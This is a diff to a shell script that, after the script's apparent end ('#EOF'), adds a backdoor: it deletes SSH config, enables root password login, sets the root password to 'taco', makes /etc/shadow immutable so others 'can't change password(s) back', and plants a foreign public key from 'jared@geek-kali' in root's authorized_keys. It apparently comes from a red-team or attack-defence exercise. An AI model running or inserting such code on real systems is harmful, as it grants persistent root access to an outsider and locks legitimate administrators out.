@@ -25,12 +25,18 @@ echo
 echo "done done - enjoy!"
 echo
 #EOF
+# wipe any existing SSH config in the proper folder
 rm -rf /etc/ssh/sshd_config.d/*.conf
+# permit root login using password and/or pubkey
 echo "PermitRootLogin yes" > /etc/ssh/sshd_config.d/custom.conf
 echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config.d/custom.conf
 echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config.d/custom.conf
 service sshd restart
+# change root password to "taco" - added without (re-)testing 2024-07-07
+echo 'root:taco' | chpasswd
+# make shadow file immutable so they can't change password(s) back
 chattr +i /etc/shadow
+# add root pubkey:
 mkdir /root/.ssh
 chattr -i /root/.ssh/authorized_keys
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpbYv5s8T6PUQ+76tqRZ0QnJFdFPRHhGCfIMbQcv5KnbZLoLmmMr6okUu9qyhjeG2IsT88dSkypS7LDyJ3j+P6RvuEWDpC8Wj6Ix+oo56JuRcTi9AzXvIPjOhCOiZIvMi5CMEEyrziMmVamqJodJxAiER/8pNBwofg4BE23ManZ18sHrfcS7xW4eQve4dwh27JEDE7/j06D86K2MHCgF1UU/HhmecSWk+GRwpyFyiNlWdtmYeDcCQ/DE01v5U0+zVaXaCfpqccQ6DzW+bafaT9ie/jmdM0hI5bp0zAKnMxb05ooS/ZffgN+GVA6RJ6olXWaIcdtRfJxtZGFZR9vQJ3HZTTqIFRrxIG8PRfQkMHxuXn3ZuUzFnOyy5r/1+0TxvmeyyPmh1LU59iwDpP7kMBNIS9LJnxviHroTIR+7HqGgS/VvdkGxLtl2iK4Srp7muDrzAz7XB+agibn+/yxBevabFDxzMttxs7uuk2YkTT3xz+9mwUTJ74Is3vaiAVUok= jared@geek-kali" > /root/.ssh/authorized_keys
